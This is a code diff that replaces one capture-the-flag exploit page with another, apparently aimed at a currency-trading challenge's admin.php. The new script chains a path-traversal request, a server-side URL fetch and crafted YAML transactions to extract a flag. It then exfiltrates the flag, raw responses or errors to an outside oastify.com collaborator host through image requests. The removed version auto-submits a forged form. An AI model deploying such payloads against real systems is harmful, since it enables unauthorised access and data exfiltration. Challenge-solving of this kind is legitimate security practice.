@@ -1,48 +1,31 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>FL Currency Flag Exploit</title>
-</head>
-<body>
-    <h1>FL Currency Flag Extraction</h1>
-    <form id="attackForm" method="POST" action="http://localhost:5000/admin.php" target="_self">
-        <input type="hidden" name="url" value="">
-    </form>
-    
-    <script>
-        // Create transaction sequence to exploit FL currency
-        const transactions = [
-            {
-                amount: 1000001,
-                currency: 'ZZ',  // Dummy currency with 0 rate
-                op: 'BUY'
-            },
-            {
-                amount: 1000001, 
-                currency: 'ZZ',  // Sell same amount to increase balance
-                op: 'SELL'
-            },
-            {
-                amount: 1,
-                currency: 'FL',  // Buy FL currency to get flag
-                op: 'BUY'
-            }
-        ];
-        
-        // Convert to URL parameters for YAML parsing
-        let params = '';
-        transactions.forEach((tx, i) => {
-            params += `transactions[${i}][amount]=${tx.amount}&`;
-            params += `transactions[${i}][currency]=${tx.currency}&`;
-            params += `transactions[${i}][op]=${tx.op}&`;
-        });
-        
-        // Set the URL for admin.php to parse
-        const targetUrl = `http://localhost:5000/admin.php?${params.slice(0, -1)}`;
-        document.getElementById('attackForm').querySelector('input[name="url"]').value = targetUrl;
-        
-        // Auto-submit the form
-        document.getElementById('attackForm').submit();
-    </script>
-</body>
-</html>
+<script>
+      (async () => {
+    try {
+      const yaml =
+        "- {amount: 1000001, currency: ZZ, op: BUY}\n" +
+        "- {amount: 1000001, currency: ZZ, op: SELL}\n" +
+        "- {amount: 1, currency: FL, op: BUY}\n";
+
+      // index.phpを使ってYAMLデータを直接返すエンドポイントを作成
+      const yamlEndpoint = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);
+
+      // admin.phpにそのエンドポイントを指定
+      const response = await fetch("/index.php/../admin.php", {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'url=' + encodeURIComponent(yamlEndpoint)
+      });
+
+      const result = await response.text();
+      const flagMatch = result.match(/Final\s+Inventory\s+FL\s*:\s*([A-Za-z0-9_\-:{}\[\].=]+)/);
+
+      if (flagMatch) {
+        new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?flag=" + encodeURIComponent(flagMatch[1]);
+      } else {
+        new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?debug=" + encodeURIComponent(result);
+      }
+    } catch (e) {
+      new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?error=" + encodeURIComponent(String(e));
+    }
+  })();
+</script>
